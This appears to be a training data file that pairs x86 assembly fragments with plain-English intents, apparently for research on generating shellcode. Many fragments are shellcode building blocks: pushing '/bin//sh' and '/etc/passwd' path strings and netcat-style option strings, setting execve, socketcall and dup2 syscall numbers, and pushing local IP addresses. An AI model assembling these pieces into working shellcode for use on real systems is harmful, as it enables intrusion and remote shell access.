SNIPPETS	INTENTS
push 0x68732f2f \n push 0x6e69622f \n mov edx, esp	put /bin/sh into edx
push 0x68732f2f \n push 0x6e69622f \n mov edx, esp	move ASCII /bin/sh into edx
push 0x68732f2f \n push 0x6e69622f \n mov edx, esp	move /bin/sh into the edx register
push 0x68732f6e	push 0x68732f6e onto the stack
push 0x68732f6e	push 0x68732f6e to the stack
push 0x68732f6e	push the 0x68732f6e onto the stack
push 0x68735858	push the value 0x68735858 onto the stack
push 0x68736162	push 0x68736162 onto the stack
push 0x68736162	push 0x68736162 to the stack
push 0x68736164	push 0x68736164 onto the stack
push 0x68736164	push 0x68736164 to the stack
push 0x6873732f	push the value 0x6873732f onto the stack
push 0x6873732f \n push 0x6374652f \n mov eax, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the eax register to the stack register
push 0x6873732f \n push 0x6374652f \n mov ebx, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
push 0x6873732f \n push 0x6374652f \n mov ecx, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the ecx register to the stack register
push 0x6873732f \n push 0x6374652f \n mov edi, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the edi register to the stack register
push 0x6873732f \n push 0x6374652f \n mov edx, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the edx register to the stack register
push 0x6873732f \n push 0x6374652f \n mov esi, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the esi register to the stack register
push 0x68737a2f	push 0x68737a2f onto the stack
push 0x69616863	push the 0x69616863 onto the stack
push 0x69622f2f	push 0x69622f2f onto the stack
push 0x69622f2f	push 0x69622f2f to the stack
push 0x69622f2f	push the 0x69622f2f onto the stack
push 0x69622f2f \n mov eax, esp	push the value 0x69622f2f onto the stack and point the eax register to the stack register
push 0x69622f2f \n mov ebx, esp	push the value 0x69622f2f onto the stack and point the ebx register to the stack register
push 0x69622f2f \n mov ecx, esp	push the value 0x69622f2f onto the stack and point the ecx register to the stack register
push 0x69622f2f \n mov edx, esp	push the value 0x69622f2f onto the stack and point the edx register to the stack register
push 0x69622f3a	push 0x69622f3a onto the stack
push 0x69622f65	push 0x69622f65 onto the stack
push 0x69622f65	push 0x69622f65 to the stack
push 0x69622f65	push the 0x69622f65 onto the stack
push 0x6962732f	push 0x6962732f onto the stack
push 0x6962732f	push the 0x6962732f onto the stack
push 0x6c626174	push 0x6c626174 onto the stack
push 0x6d722f2f	push the 0x6d722f2f onto the stack
push 0x6d726574	push 0x6d726574 onto the stack
push 0x6d726574	push 0x6d726574 to the stack
push 0x6e	push the 0x6e onto the stack
push 0x6e69622f	push /bin to the stack
push 0x6e69622f	push 0x6e69622f onto the stack
push 0x6e69622f	push ascii nib/ onto stack
push 0x6e69622f	push nib/
push 0x6e69622f	push the 0x6e69622f onto the stack
push 0x6e69622f	push the value 0x6e69622f onto the stack
push 0x6e69622f \n push 0x7273752f \n mov eax, esp	push the value 0x6e69622f and the value 0x7273752f onto the stack and point the eax register to the stack register
push 0x6e69622f \n push 0x7273752f \n mov ebx, esp	push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ebx register to the stack register
push 0x6e69622f \n push 0x7273752f \n mov ecx, esp	push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ecx register to the stack register
push 0x6e69622f \n push 0x7273752f \n mov edx, esp	push the value 0x6e69622f and the value 0x7273752f onto the stack and point the edx register to the stack register
push 0x6e776f64	push the 0x6e776f64 onto the stack
push 0x6e7a762d	push 0x6e7a762d onto the stack
push 0x6e7a762d \n mov ebp, esp	push the value 0x6e7a762d onto the stack and point the ebp register to the stack register
push 0x6e7a762d \n mov ebx, esp	push the value 0x6e7a762d onto the stack and point the ebx register to the stack register
push 0x6e7a762d \n mov edi, esp	push the value 0x6e7a762d onto the stack and point the edi register to the stack register
push 0x6e7a762d \n mov esi, esp	push the value 0x6e7a762d onto the stack and point the esi register to the stack register
push 0x6f635f64	push 0x6f635f64 onto the stack
push 0x6f723a30	push 0x6f723a30 onto the stack
push 0x7 \n mov edx, esp	push the value 0x7 onto the stack and point edx to the stack register
push 0x70692f6e	push 0x70692f6e onto the stack
push 0x70692f6e	push the 0x70692f6e onto the stack
push 0x706d742f	push 0x706d742f onto the stack
push 0x706d742f	push 0x706d742f to the stack
push 0x706d742f	push the 0x706d742f onto the stack
push 0x7268732f	push 0x7268732f onto the stack
push 0x72706475	push 0x72706475 onto the stack
push 0x7273752f	push 0x7273752f onto the stack
push 0x7273752f	push 0x7273752f to the stack
push 0x7361702f	push 0x7361702f onto the stack
push 0x7361702f	push 0x7361702f to the stack
push 0x73644d24	push 0x73644d24 onto the stack
push 0x7369642d	push 0x7369642d onto the stack
push 0x7369642d	push 0x7369642d to the stack
push 0x7372656f	push 0x7372656f onto the stack
push 0x7372656f	push 0x7372656f to the stack
push 0x7372656f	push the 0x7372656f onto the stack
push 0x7374736f	push 0x7374736f onto the stack
push 0x7374736f	push the 0x7374736f onto the stack
push 0x74	push 0x74 onto the stack
push 0x74	push 0x74 to the stack
push 0x742f2f2f	push 0x742f2f2f onto the stack
push 0x742f2f2f	push the 0x742f2f2f onto the stack
push 0x742f3a31	push 0x742f3a31 onto the stack
push 0x74303072	push 0x74303072 onto the stack
push 0x7461632f \n push 0x6e69622f \n mov eax, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the eax register to the stack register
push 0x7461632f \n push 0x6e69622f \n mov ebx, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ebx register to the stack register
push 0x7461632f \n push 0x6e69622f \n mov ecx, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ecx register to the stack register
push 0x7461632f \n push 0x6e69622f \n mov edi, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edi register to the stack register
push 0x7461632f \n push 0x6e69622f \n mov edx, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edx register to the stack register
push 0x7461632f \n push 0x6e69622f \n mov esi, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the esi register to the stack register
push 0x74652f2f	push 0x74652f2f onto the stack
push 0x74652f2f	push the 0x74652f2f onto the stack
push 0x746f6f72	push 0x746f6f72 onto the stack
push 0x74756873	push the 0x74756873 onto the stack
push 0x74756f2f	push 0x74756f2f onto the stack
push 0x74756f2f	push the 0x74756f2f onto the stack
push 0x752f2f2f	push 0x752f2f2f onto the stack
push 0x752f2f2f	push 0x752f2f2f to the stack
push 0x7665642f	push 0x7665642f onto the stack
push 0x7665642f	push the 0x7665642f onto the stack
push 0x76766c2d	push 0x76766c2d onto the stack
push 0x76766c2d	push 0x76766c2d to the stack
push 0x76766c2d	push the 0x76766c2d onto the stack
push 0x78	push 0x78 onto the stack
push 0x78	push 0x78 to the stack
push 0x78	push the 0x78 onto the stack
push 0x782f2f32	push 0x782f2f32 onto the stack
push 0x782f2f32	push 0x782f2f32 to the stack
push 0x782f6e69	push 0x782f6e69 onto the stack
push 0x782f6e69	push 0x782f6e69 to the stack
push 0x78534a52	push 0x78534a52 onto the stack
push 0x79616c70	push 0x79616c70 onto the stack
push 0x79616c70	push 0x79616c70 to the stack
push 0x8	push 0x8 onto the stack
push 0x81e3a8c0	push 0x81e3a8c0 onto the stack
push 0x8501a8c0	push 0x8501a8c0 onto the stack
push 0xa	push 0xa onto the stack
push 0xa	push 0xa to the stack
push 0xa01a8c0	push the 0xa01a8c0 onto the stack
push 0xb	push 0xb onto the stack
push 0xb	push 0xb to the stack
push 0xdebf	push 0xdebf value to the stack
push 0xefffff7f	push 0xefffff7f onto the stack
push 0xf	push 0xf onto the stack
push 1	push 1 onto the stack
push 1	push 1 to the stack
push 10	push 10 onto the stack
push 10 \n mov eax, esp	push the value 10 onto the stack and point eax to the stack register
push 102	push 102 onto the stack
push 12 \n mov ebx, esp	push the value 12 onto the stack and point ebx to the stack register
push 15 \n mov ecx, esp	push the value 15 onto the stack and point ecx to the stack register
push 16	push 16 onto the stack
push 2	push 2 onto the stack
push 20	push 20 onto the stack
push 20	push the 20 onto the stack
push 216	push 216 value to the stack
push 6	push 6 onto the stack
push ax	push ax onto the stack
push ax	push ax to the stack
push ax	push the ax onto the stack
push bx	push bx onto the stack
push bx	push bx to the stack
push bx	push the contents of the bx register onto the stack
push byte -1	push the byte -1 onto the stack
push byte +0x1	push the byte +0x1 onto the stack
push byte +0x10	push the byte +0x10 onto the stack
push byte +0x2	push the byte +0x2 onto the stack
push byte +0x3	push the byte +0x3 onto the stack
push byte +0x46	push the byte +0x46 onto the stack
push byte +0x6	push the byte +0x6 onto the stack
push byte +0x66	push the byte +0x66 onto the stack
push byte +0x7f	push the byte +0x7f onto the stack
push byte +0x8	push the byte +0x8 onto the stack
push byte +0xb	push the byte +0xb onto the stack
push byte 0	push byte 0 onto stack
push byte 0x0	push the byte 0x0 onto the stack
push byte 0x01	push the byte 0x01 onto the stack
push byte 0x01	push the byte 0x01 to the stack
push byte 0x01 \n pop eax	put the syscall 0x01 into the eax register
push byte 0x02	push the byte 0x02 onto the stack
push byte 0x02	push the byte 0x02 to the stack
push byte 0x02 \n pop eax	put the syscall 0x02 into the eax register
push byte 0x04	push the byte 0x04 onto the stack
push byte 0x04 \n pop eax	put the syscall 0x04 into the eax register
push byte 0x05	push the byte 0x05 onto the stack
push byte 0x05 \n pop eax	put the syscall 0x05 into the eax register
push byte 0x06	push the byte 0x06 onto the stack
push byte 0x06 \n pop eax	put the syscall 0x06 into the eax register
push byte 0x0b	push the byte 0x0b onto the stack
push byte 0x0b \n pop eax	put the syscall 0x0b into the eax register
push byte 0x1	push the byte 0x1 onto the stack
push byte 0x1	push the byte 0x1 to the stack
push byte 0x1 \n mov ecx, esp	push the byte 0x1 onto the stack and point ecx to the stack register
push byte 0x10	push the byte 0x10 onto the stack
push byte 0x10 \n pop eax	put the syscall 0x10 into the eax register
push byte 0x11 \n mov ebx, esp	push the byte 0x11 onto the stack and point ebx to the stack register
push byte 0x17	push the byte 0x17 onto the stack
push byte 0x17 \n pop eax	put the syscall 0x17 into the eax register
push byte 0x1c	push the byte 0x1c onto the stack
push byte 0x1c \n pop eax	put the syscall 0x1c into the eax register
push byte 0x1f	push the byte 0x1f onto the stack
push byte 0x1f \n pop eax	put the syscall 0x1f into the eax register
push byte 0x2	push the byte 0x2 onto the stack
push byte 0x2	push the byte 0x2 to the stack
push byte 0x2 \n mov ecx, esp	push the byte 0x2 onto the stack and point ecx to the stack register
push byte 0x2 \n pop eax	put the syscall 0x2 into the eax register
push byte 0x2e	push the byte 0x2e onto the stack
push byte 0x2e \n pop eax	put the syscall 0x2e into the eax register
push byte 0x2f	push the byte 0x2f onto the stack
push byte 0x2f \n pop eax	put the syscall 0x2f into the eax register
push byte 0x3	push the byte 0x3 onto the stack
push byte 0x3 \n pop eax	put the syscall 0x3 into the eax register
push byte 0x30	push the byte 0x30 onto the stack
push byte 0x30 \n pop eax	put the syscall 0x30 into the eax register
push byte 0x3f	push the byte 0x3f onto the stack
push byte 0x3f \n pop eax	put the syscall 0x3f into the eax register
push byte 0x4	push the byte 0x4 onto the stack
push byte 0x4 \n pop eax	put the syscall 0x4 into the eax register
push byte 0x43	make the system call sigaction
push byte 0x43	sigaction
push byte 0x43	syscall for sigaction
push byte 0x43	system call sigaction
push byte 0x43 \n pop eax	put the syscall 0x43 into the eax register
push byte 0x43 \n pop eax	put syscall sigaction into the eax register
push byte 0x5 \n mov ebx, esp	push the byte 0x5 onto the stack and point ebx to the stack register
push byte 0x5 \n mov edx, esp	push the byte 0x5 onto the stack and point edx to the stack register
push byte 0x64	push the byte 0x64 onto the stack
push byte 0x64	push the byte 0x64 to the stack
push byte 0x64 \n pop eax	put the syscall 0x64 into the eax register
push byte 0x66	push the byte 0x66 onto the stack
push byte 0x66 \n pop eax	put the syscall 0x66 into the eax register
push byte 0x7 \n mov edx, esp	push the byte 0x7 onto the stack and point edx to the stack register
push byte 0x77	push the byte 0x77 onto the stack
push byte 0x77	push the byte 0x77 to the stack
push byte 0x77 \n pop eax	put the syscall 0x77 into the eax register
push byte 0x8 \n mov edx, esp	push the byte 0x8 onto the stack and point edx to the stack register
push byte 0xb	push the byte 0xb onto the stack
push byte 0xb \n pop eax	put the syscall 0xb into the eax register
push byte 0xc	push the byte 0xc onto the stack
push byte 0xc \n pop eax	put the syscall 0xc into the eax register
push byte 1	move byte 1 onto stack
push byte 1	push byte 1 onto the stack
push byte 1	push the byte 1 onto the stack
